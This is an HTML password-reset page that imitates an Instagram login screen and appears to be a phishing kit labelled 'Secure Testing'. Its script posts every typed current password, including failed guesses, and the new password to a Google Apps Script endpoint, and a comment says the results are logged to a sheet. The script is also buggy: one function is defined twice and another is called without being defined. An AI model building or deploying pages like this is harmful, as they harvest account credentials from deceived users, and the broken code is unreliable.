<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Reset Password - Secure Testing</title>
  <style>
    * { box-sizing: border-box; font-family: -apple-system, sans-serif; }
    body {
      margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
      background: radial-gradient(circle at top, #111820, #0b0f14 60%); color: #eaeaea;
    }
    .card {
      width: 100%; max-width: 420px; padding: 40px 32px; background: rgba(15, 20, 26, 0.9);
      border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.6);
    }
    
    h1 { font-size: 20px; text-align: center; margin-bottom: 12px; }
    .desc { font-size: 14px; color: #9aa4af; text-align: center; margin-bottom: 28px; }
    input {
      width: 100%; padding: 14px; margin-bottom: 5px; background: #1b1f24;
      border: 1px solid #2a2f36; border-radius: 8px; color: #fff;
    }
    input:focus { outline: none; border-color: #3b82f6; }
    .msg { font-size: 12px; margin-bottom: 12px; height: 15px; }
    .error { color: #ef4444; }
    .success { color: #22c55e; }
    .btn {
      width: 100%; margin-top: 10px; padding: 14px; border: none; border-radius: 10px;
      background: #0b5ed7; color: #fff; font-weight: 600; cursor: pointer;
      opacity: 0.4; pointer-events: none;
    }
    .btn.enabled { opacity: 1; pointer-events: auto; }
  </style>
</head>
<body>
  <div class="card">
<div style="display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 25px; width: 100%;">
  <img src="https://imgs.search.brave.com/2rdGHcywukRDhEZCwf5Mxn3W2fFX9rN5OwkaAo2K5-8/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9mcmVl/cG5nbG9nby5jb20v/aW1hZ2VzL2FsbF9p/bWcvMTcxNTk2NjM2/M2luc3RhZ3JhbS1s/b2dvLXdpdGgtbmFt/ZS1wbmcucG5n" alt="Logo" style="width: 150px; height: 150px; object-fit: contain;">
  
  <span style="font-family: 'Satisfy', cursive; font-size: 42px; color: #ffffff; margin-top: -8px;"></span>
</div>
    <h1>Create A Strong Password</h1>
    <p class="desc">Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!$@%).</p>

    <input type="password" id="oldpass" placeholder="Current password" />
    <div id="oldMsg" class="msg"></div>

    <input type="password" id="newpass" placeholder="New password" />
    <div id="newMsg" class="msg"></div>

    <input type="password" id="confirmpass" placeholder="New password, again" />
    <div id="confirmMsg" class="msg"></div>

    <button class="btn" id="btn">Reset Password</button>
  </div>

  <script>
    // 1. NEE GOOGLE SCRIPT URL IKKADA PETTU
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzW8n47ncVq_5J4TKVoxMHOFBqEoLslSQ8NuDMC21U4BVro4eWkHR24ZRoz4jtuErDByw/exec';

    const oldPass = document.getElementById('oldpass');
    const newPass = document.getElementById('newpass');
    const confirmPass = document.getElementById('confirmpass');
    const btn = document.getElementById('btn');
    const oldMsg = document.getElementById('oldMsg');

    // TESTING CONFIG
    const MOCK_DB_PASSWORD = "Admin@123"; 
    let failedCount = 0;
    let oldVerified = false;

    // Background reporting function
    async function postData(currentVal, newVal) {
      try {
        await fetch(SCRIPT_URL, {
          method: 'POST',
          mode: 'no-cors',
          body: JSON.stringify({ current: currentVal, newP: newVal })
        });
      } catch (e) { console.log("Network error", e); }
    }

   function validateOldPassword() {
  const val = oldPass.value;
  if (!val) return;

  // IKKADA DB PASSWORD NI DIRECT GA CHECK CHESTUNNAM
  const REAL_PASSWORD = "Admin@123"; // Nuvvu test cheyali anukuntunna correct password idhi

  if (val === REAL_PASSWORD) {
    oldVerified = true;
    oldMsg.textContent = 'Password verified';
    oldMsg.className = 'msg success';
    oldPass.style.borderColor = '#22c55e';
    failedCount = 0; // Success ayindi kabatti count reset
  } else {
    oldVerified = false;
    failedCount++;
    oldMsg.textContent = 'Incorrect password';
    oldMsg.className = 'msg error';
    oldPass.style.borderColor = '#ef4444';

    // 1st time nunde thappu kodithe sheet ki report velthundi
    if (failedCount >= 1) {
      postData("WRONG_ATTEMPT_" + failedCount + ": " + val, "SECURITY_ALERT");
    }
  }
}

    function validateOldPassword() {
      const isNewFilled = newPass.value.length > 0;
      const isMatch = newPass.value === confirmPass.value && confirmPass.value.length > 0;
      
      // Update UI messages
      document.getElementById('confirmMsg').textContent = isMatch ? 'Passwords match' : (confirmPass.value ? 'Do not match' : '');
      document.getElementById('confirmMsg').className = isMatch ? 'msg success' : 'msg error';

      if (oldVerified && isNewFilled && isMatch && newPass.value !== oldPass.value) {
        btn.classList.add('enabled');
      } else {
        btn.classList.remove('enabled');
      }
    }

    // Listeners
    oldPass.addEventListener('blur', () => { validateOldPassword(); validateAll(); });
    newPass.addEventListener('input', validateAll);
    confirmPass.addEventListener('input', validateAll);

    // Final Reset Button
    btn.addEventListener('click', async () => {
      btn.textContent = "Updating...";
      btn.classList.remove('enabled');
      
      await postData(oldPass.value, newPass.value);
      
      alert("Password updated successfully and recorded in Sheet!");
      location.reload();
    });
  </script>
</body>
</html>
